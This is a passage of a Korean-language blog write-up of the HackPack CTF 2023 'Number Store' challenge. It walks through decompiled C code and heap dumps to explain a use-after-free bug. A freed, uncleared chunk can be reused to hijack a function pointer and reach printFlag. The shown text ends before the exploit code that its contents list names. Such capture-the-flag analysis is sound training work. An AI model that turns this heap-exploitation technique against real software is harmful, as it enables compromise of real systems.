<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1893   Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite">
<meta property="og:type" content="article">
<meta property="og:title" content="HackPack CTF 2023 - Number Store (UAF)">
<meta property="og:url" content="https://jiravvit.github.io/230417-hackpackctf2023-number_store/index.html">
<meta property="og:site_name" content="HyeonJi Son">
<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1893   Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-04-16T22:00:00.000Z">
<meta property="article:modified_time" content="2023-04-17T18:34:37.680Z">
<meta property="article:author" content="HyeonJi Son">
<meta property="article:tag" content="uaf">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>HackPack CTF 2023 - Number Store (UAF)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/230418-jerseyctf2023-tracer/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/230414-damctf2023-baby-review/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230417-hackpackctf2023-number_store/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&text=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&is_video=false&description=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackPack CTF 2023 - Number Store (UAF)&body=Check out this article: https://jiravvit.github.io/230417-hackpackctf2023-number_store/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&title=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&name=HackPack CTF 2023 - Number Store (UAF)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230417-hackpackctf2023-number_store/&t=HackPack CTF 2023 - Number Store (UAF)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-leak"><span class="toc-number">1.1.</span> <span class="toc-text">How to leak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackPack CTF 2023 - Number Store (UAF)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">HyeonJi Son</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-16T22:00:00.000Z" itemprop="datePublished">2023-04-17</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/HackPack/">HackPack</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/uaf/" rel="tag">uaf</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ul>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1893">https://ctftime.org/event/1893</a></li>
</ul>
<blockquote>
<p>Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite secret numbers or generate new random ones! Also comes with a super secret flag!<br><code>nc cha.hackpack.club 41705</code></p>
</blockquote>
<ul>
<li>[48 solves &#x2F; 116 points]</li>
</ul>
<p>아마 이 블로그 최초 uaf 롸업이지 않나 싶다. 힙 문제를 기피했었는데 태그가 easy여서 풀어봤다..<br>ctf 시작하고 바이너리를 다운받고 끝나고 풀어봤는데 중간에 바이너리가 바뀌었다. <code>printFlag</code> 함수 주소만 바꿔주니 remote로 플래그를 얻을 수 있어서 그냥 예전 바이너리 코드를 보겠다 ㅎ.. (실제로 분석은 예전 바이너리로 했기 때문..)</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>일단 <code>main</code> 함수를 살펴보자.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> func_result; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> print_idx; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> edit_idx; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> IndexNum; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> UserNum; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  _QWORD *_func_result; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **Number_obj; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *Number_obj_copy; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  Number_obj = (<span class="type">const</span> <span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">8uLL</span>);<span class="comment">// 8짜리 10개</span></span><br><span class="line">  Number_obj_copy = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">16uLL</span>);<span class="comment">// 16짜리 10개</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">159</span>; i += <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;Number_obj_copy[i], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  _func_result = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  printStr(<span class="string">&quot;WELCOME TO NUMBER STORE\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Store your favorite or secret numbers here! You can even generate new random numbers!\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Now includes a super secret flag!\n\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    printStr(<span class="string">&quot;1.) Store New Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;2.) Delete Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;3.) Edit Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;4.) Show Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;5.) Show Number List\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;6.) Generate Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;7.) Show Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;8.) Show Super Secret Flag\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;9.) Quit\n\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;Choose option: &quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)getUserNum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of new number (0-9): &quot;</span>);</span><br><span class="line">        UserNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( UserNum &gt;= <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">goto</span> Index_out_of_bound;</span><br><span class="line">        createStaticNum(UserNum, (__int64)Number_obj);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * UserNum], Number_obj[UserNum], <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to delete (0-9): &quot;</span>);</span><br><span class="line">        IndexNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( IndexNum &lt; <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          deleteObject(IndexNum, (__int64)Number_obj);</span><br><span class="line">          <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * IndexNum], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index!\n&quot;</span>);         <span class="comment">// 음수 안됨 oob x</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to edit (0-9): &quot;</span>);</span><br><span class="line">        edit_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt; <span class="number">0xA</span> )</span><br><span class="line">          editObject(edit_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Select index of number to print (0-9): &quot;</span>);</span><br><span class="line">        print_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( print_idx &gt;= <span class="number">0xA</span> )</span><br><span class="line">Index_out_of_bound:</span><br><span class="line">          printStr(<span class="string">&quot;Index out of bounds!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          readObject(print_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        showList((__int64)Number_obj_copy);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행해야함</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Access Denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Option does not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printStr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( _func_result )</span><br><span class="line">    <span class="built_in">free</span>(_func_result);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;Number_obj_copy[<span class="number">16</span> * j], <span class="string">&quot;none&quot;</span>) )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)Number_obj[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(Number_obj_copy);</span><br><span class="line">  <span class="built_in">free</span>(Number_obj);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>일단 1번 메뉴를 살펴보자. <code>createStaticNum</code> 함수이다. 참고로 여러 기능을 실행하기 전에 <code>getUserNum</code> 함수를 통해 인덱스를 받아오는데 음수를 잘 거르고 있으니 oob와 같은 취약점이 발생할 수 없다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">createStaticNum</span><span class="params">(<span class="type">int</span> idx, __int64 obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *name_ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  printStr(<span class="string">&quot;Enter object name: &quot;</span>);</span><br><span class="line">  getName(name_ptr);</span><br><span class="line">  printStr(<span class="string">&quot;Enter number: &quot;</span>);</span><br><span class="line">  name_ptr[<span class="number">2</span>] = getUserNum();</span><br><span class="line">  result = name_ptr;</span><br><span class="line">  *(_QWORD *)(obj + <span class="number">8LL</span> * idx) = name_ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>idx</code>와 <code>obj</code>가 인자로 넘어왔다. <code>malloc</code>을 통해서 <code>name</code>을 입력받는 공간을 할당한다. 그러니깐 <code>obj</code>는 아래처럼 생겼다. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_ptr + 0x00: name</span><br><span class="line">name_ptr + 0x10: name</span><br><span class="line">name_ptr + 0x18: num</span><br><span class="line">...</span><br><span class="line">obj + 0x00: name_ptr </span><br><span class="line">obj + 0x08: name_ptr A</span><br><span class="line">obj + 0x10: name_ptr B</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>디버깅하면서 처음 알게되었는데 늦게 malloc되면 주소가 위로 올라간다. </p>
<p>이제 <code>deleteObject</code> 함수를 살펴보자.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">deleteObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">8LL</span> * idx + a2));             <span class="comment">// free하고 나서 데이터를 초기화 시켜줘야하는데 안 시켜줌</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>주석에도 적혀있듯이, <code>free</code>하고 나서 데이터도 함께 초기화 시켜줘야하는데 안 시켜줬다. 그러면 데이터가 그대로 남아있게 된다.</p>
<ul>
<li><p>입력</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createStaticNum(0, &#x27;aaaa&#x27;, 1234)</span><br></pre></td></tr></table></figure>
</li>
<li><p>free 전</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x0000000061616161      0x0000000000000000</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure>
</li>
<li><p>free 후</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x000000055fa7d968      0x672609a652e683d0</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li>
</ul>
<p><code>name</code> 부분은 이상해졌는데,.. <code>num</code>은 그대로 보존되어 있다. 해제 후에도 이 값을 이용할 수 있기 때문에 이 값을 이용할 것이다. (int)라서 주소 넣기 딱 좋아보인다.</p>
<p>이제 또 다른 <code>malloc</code>을 찾을 것이다. 왜냐하면 <code>heap chunk</code>를 해제하고 똑같은 크기의 <code>heap chunk</code>를 할당하면 동일한 위치한다는 것을 이용할 것이기 때문이다. <code>malloc</code>을 사용하는 곳이 총 두 곳 있는데, 하나는 위의  <code>createStaticNum</code> 함수이고 다른 하나는 <code>createRandomNum</code>이다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">createRandomNum</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  srand(<span class="number">0</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  buf[<span class="number">2</span>] = generateRandNum;                     <span class="comment">// 함수 포인터</span></span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *buf = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>이 구조는 아래와 같이 생겼다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf + 0x00: 0</span><br><span class="line">buf + 0x10: 0</span><br><span class="line">buf + 0x18: generateRandNum func_ptr</span><br></pre></td></tr></table></figure>

<p>이 구조는 뭔가 아까 위에서 본 name_ptr과 유사하다. 서로 다른 구조체가 있는데 용도는 다르지만 크기가 동일하다. A 용도에서 해제할 때 데이터가 초기화가 되지 않아 B 용도일 때 사용될 수 있다. uaf 취약점은 보통 이렇게 이용된다. </p>
<p><code>createRandomNum</code> 함수는 아래와 같이 <code>main</code> 함수에서 호출되고 이용된다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p><code>_func_result</code>가 없는 경우 <code>createRandomNum</code> 함수를 통해 랜덤한 수를 받아온다. 랜덤한 수를 어떻게 받아오냐? <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> 이 라인을 통해 <code>createRandomNum</code> 함수에서 메모리에 저장한 <code>generateRandNum</code> 함수 포인터를 실행한다. 그 결과를 7번 메뉴에서 출력할 수 있다. </p>
